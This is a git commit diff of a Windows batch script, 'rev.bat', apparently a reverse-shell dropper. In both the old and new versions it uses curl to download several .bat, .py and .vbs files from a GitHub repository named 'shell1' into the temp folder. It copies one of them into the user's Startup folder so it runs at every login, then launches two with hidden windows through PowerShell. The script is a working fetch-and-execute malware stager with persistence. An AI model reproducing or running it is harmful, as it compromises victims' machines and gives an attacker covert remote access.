083c0c4c8ffa92fdecd90ff58576f02439e3fa98
0x2034 <168307322+0x2034@users.noreply.github.com>
2024-05-06 20:19:47 +0300

    Update rev.bat

--- rev.bat
+++ rev.bat
@@ -1,11 +1,10 @@
 @echo off
-curl https://raw.githubusercontent.com/0x2034/shell/main/pro.bat -o %temp%\pro.bat
-curl https://raw.githubusercontent.com/0x2034/shell/main/sh.py -o %temp%\sh.py
-curl https://raw.githubusercontent.com/0x2034/shell/main/vb.bat -o %temp%\vb.bat
-curl https://raw.githubusercontent.com/0x2034/shell/main/vb1.bat -o "%temp%\vb1.bat"
-curl https://raw.githubusercontent.com/0x2034/shell/main/post.bat -o "%temp%\nivbtdtdow.bat"
-curl https://raw.githubusercontent.com/0x2034/shell/main/start.bat -o "%temp%\start.bat"
-move "%temp%\start.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
+curl https://raw.githubusercontent.com/0x2034/shell1/main/pro.bat -o %temp%\pro.bat
+curl https://raw.githubusercontent.com/0x2034/shell1/main/sh.py -o %temp%\sh.py
+curl https://raw.githubusercontent.com/0x2034/shell1/main/vb.bat -o %temp%\vb.bat
+curl https://raw.githubusercontent.com/0x2034/shell1/main/vb1.bat -o "%temp%\vb1.bat"
+curl https://raw.githubusercontent.com/0x2034/shell1/main/start.vbs -o "%temp%\start.vbs"
+move "%temp%\start.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
 powershell -c "Start-Process -FilePath "%temp%\vb.bat" -WindowStyle Hidden"
 powershell -c "Start-Process -FilePath "%temp%\vb1.bat" -WindowStyle Hidden"
 exit
